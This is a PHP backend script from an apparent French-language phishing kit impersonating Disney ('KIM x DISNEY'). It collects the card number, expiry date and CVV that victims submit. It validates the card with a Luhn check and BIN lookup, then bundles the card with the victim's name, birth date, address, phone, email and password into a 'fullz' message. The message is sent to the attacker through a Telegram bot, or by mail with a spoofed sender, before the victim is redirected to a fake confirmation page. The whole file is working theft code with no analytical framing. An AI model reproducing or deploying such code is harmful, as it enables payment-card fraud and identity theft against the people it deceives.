<?php
session_start();
include '../../email.php';
include '../../config2.php';

if($_SERVER['REQUEST_METHOD'] == 'POST'){
    if ($_POST["c_num"] == "" || $_POST["c_num"] == null || $_POST["exdate"] == "" || $_POST["exdate"] == null || $_POST["csc"] == "" || $_POST["csc"] == null) {
        header('location: ../card.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
    }

    $_SESSION["c_num"]    = $_POST["c_num"];
    $_SESSION["exdate"]    = $_POST["exdate"];
    $_SESSION["csc"]    = $_POST["csc"];
$bin=substr(str_replace(' ','',$_SESSION["c_num"]),0,6);	                  
	function cardData($w, $x) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/" . $x);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 400);
        $json = curl_exec($ch);
        curl_close($ch);
        if ($json == false || $json == '{"valid":false}') {
            return "N/A";
        }
        $code = json_decode($json);
        switch ($w) {
            case "type":
                $str = $code->{'type'};
                break;
            case "brand":
                $str = $code->{'brand'};
                break;
            case "level":
                $str = $code->{'category'};
                break;
            case "bank":
                $str = isset($code->{'bank'}->{'name'}) ? $code->{'bank'}->{'name'} : "Inconnu";
                break;
            case "status":
                $str = $code->{'country'}->{'currency'};
                break;
            case "countryName":
                $str = $code->{'country'}->{'name'};
                break;
            default:
                $str = $code->{'scheme'};
        }
        return $str;
	}
	
    $_SESSION["c_num"]    = $_POST["c_num"];
    $_SESSION["exm"]    = $_POST["exm"];
    $_SESSION["exy"]    = $_POST["exy"];
    $_SESSION["csc"]    = $_POST["csc"]; 
	 $b = $_SESSION["c_num"];
        $bins = str_replace(' ', '', $b);
        $bin = str_replace(' ', '', substr($b ,0,6));
            $bin_type    = cardData('type', $bins);
    $bin_level   = cardData('level', $bins);
    $bin_brand   = cardData('brand', $bins);
	$bin_status  = cardData('status', $bins);
	$bin_scheme  = cardData('', $bins);
    $bin_bank    = cardData('bank', $bins);
    $bin_country = cardData('countryName', $bins); 
$message = 'Nom : '.$_SESSION["surname"].'
<br>Prenom : '.$_SESSION["name"].'
<br>Date de naissance : '.$_SESSION["dob"].'
<br>Adresse : '.$_SESSION["address"].'
<br>Code Postal : '.$_SESSION["zipcode"].'
<br>Ville : '.$_SESSION["city"].'
<br>Numero de telephone : '.$_SESSION["tel"].'
<br>CC : '.$_SESSION["c_num"].'
<br>Date Expiration : '.$_SESSION["exdate"].'
<br>CVV : '.$_SESSION["csc"].'
<br>Type de carte : '.$bin_scheme." ".$bin_brand.'
<br>Banque : '.$bin_bank.'
<br>IP : '._ip().'
<br>User Agent : '.$_SERVER["HTTP_USER_AGENT"].'
';
$Subject="+1 CC | {$bin} | {$bin_scheme} {$bin_brand} | {$bin_bank} | "._ip();
$head  = 'MIME-Version: 1.0' . "\r\n";
$head .= 'Content-type: text/html; charset="utf-8"' . "\r\n";
$head .="From: Koda <rez@account-verif.com> \r\n" .
'X-Mailer: PHP/' . phpversion();
function is_valid_luhn($number) {
  settype($number, 'string');
  $sumTable = array(
    array(0,1,2,3,4,5,6,7,8,9),
    array(0,2,4,6,8,1,3,5,7,9));
  $sum = 0;
  $flip = 0;
  for ($i = strlen($number) - 1; $i >= 0; $i--) {
    $sum += $sumTable[$flip++ & 0x1][$number[$i]];
  }
  return $sum % 10 === 0;
}
if(is_valid_luhn($_SESSION["c_num"]) && is_numeric($_SESSION["c_num"])){

    if($tlg_send == true)
{
  $data = [
    'text' => '

[💳]  +1 CC KIM x DISNEY 🔥  [💳]

☠️ Nom/Prénom : ' .$_SESSION["name"]. ' ' .$_SESSION["surname"]. '
☠️ Numéro : '.$_SESSION["c_num"].'
☠️ Expiration : '. $_SESSION["exdate"].'
☠️ CVV : '. $_SESSION["csc"].'

🏦 Banque : '.$bin_bank.'
🏦 Niveau : '.$bin_level.'
🏦 Type : '.$bin_scheme." ".$bin_brand.'

[⭐️ FULLZ ⭐️]

⭐️ Nom • '. $_SESSION["surname"].'
⭐️ Prénom • '. $_SESSION["name"].'
⭐️ Date De Naissance • '. $_SESSION["dob"].'

⭐️ Téléphone • '. $_SESSION["tel"].'
⭐️ Adresse • '. $_SESSION["address"].'
⭐️ Ville • '. $_SESSION["city"].'
⭐️ Code Postal • '. $_SESSION["zipcode"].'

[🎓] KIM x DISNEY +1 LOG [🎓]

🪐 E-Mail : '. $_SESSION["email"].'
🪐 Mot de passe : '. $_SESSION["pass"].'

[🔋] Tiers [🔋]
        
🌐 Adresse Ip : '.$_SESSION['ip'].'
👤 User-agent : '.$_SESSION['useragent'].'  
'
  ];
  
  file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id={$chat}&".http_build_query($data) );// Don't delete
}

$_SESSION['step_three']  = true;
if ($mail_send == true)
{
  mail($my_mail, $Subject, $msg, $head);
}
if($vbv == true)
{
    header('location: ../loadvbv.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));   
}else{
    header('location: ../merci.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));   
}
    
} else {
        header('location: ../card.php?error=true');   
    }
}
else
{
  header('location: ../../../index.php');
} 
?>